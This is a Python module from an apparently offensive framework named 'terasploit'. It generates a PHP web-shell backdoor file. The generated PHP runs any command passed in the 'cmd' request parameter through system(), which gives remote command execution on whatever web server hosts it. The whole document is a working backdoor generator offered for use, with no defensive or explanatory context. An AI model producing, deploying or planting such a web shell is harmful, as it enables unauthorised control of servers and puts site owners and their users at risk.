#######
# Module/Payload: Backdoor Shell
#######

from libs.terasploit.framework.opts.opt_container import *
from libs.terasploit.framework.info.info_container import *
from libs.terasploit.framework.module.payload import *

class TerasploitPayload(Payload):

    module_type = 'payload'  

    def initialize(self,info_only: bool = False) -> None:
        update_info (
            {
                'Module' : 'payload',
                'Name' : 'backdoor cmd for http websites',
                'Author' : 'Charlie (4steroth)',
                'Type' : 'backdoor_cmd',
                'Arch' : 'php',
            
                'Description' : [
                    'cmd backdoor for http websites via request library.'
                ]
            }
        )
        
        if info_only:
            return
    
        register_option (module="payload",reset=True)
        
        
    def run(self) -> tuple[str, bool]: 
        payload_content = self.shell_content()
        payload_arch = module_info.payload_info['Arch']
        shell_name = module_info.payload_info['Type']
        info_print (f'Generating {shell_name}...')
        self.generate_file(shell_name,payload_arch,payload_content)
        info_print ('Shell generated!')
        info_print(f'Saved as {shell_name}.php')
        return 'done', True
    
    
    def shell_content(self):
        line = '\n'
        php_code: list = [
            "<?php",
                "if(isset($_REQUEST['cmd'])){",
                    "$cmd = ($_REQUEST['cmd']);",
                    "system($cmd);",
                    "die;",
                "}",
            "?>"
        ]

        code = line.join(php_code)

        return code